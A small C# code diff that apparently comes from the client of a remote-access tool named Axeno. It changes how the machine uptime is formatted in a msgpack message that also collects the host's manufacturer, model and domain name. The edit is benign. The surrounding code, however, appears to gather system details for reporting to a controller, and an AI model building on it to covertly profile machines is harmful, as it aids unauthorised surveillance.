@@ -27,7 +27,7 @@ namespace Axeno.Client.Networking.Functions.General
             msgpack.ForcePathObject("Manafacturer").AsString = GetManafacturer();
             msgpack.ForcePathObject("Model").AsString = GetModel();
             msgpack.ForcePathObject("Domain").AsString = Environment.UserDomainName;
-            msgpack.ForcePathObject("Uptime").AsString = GetUpTime().Days.ToString();
+            msgpack.ForcePathObject("Uptime").AsString = $"{GetUpTime().Days.ToString()} days, {GetUpTime().Hours.ToString()} hours, {GetUpTime().Minutes.ToString()} minutes.";
             return msgpack.Encode2Bytes();
         }
 
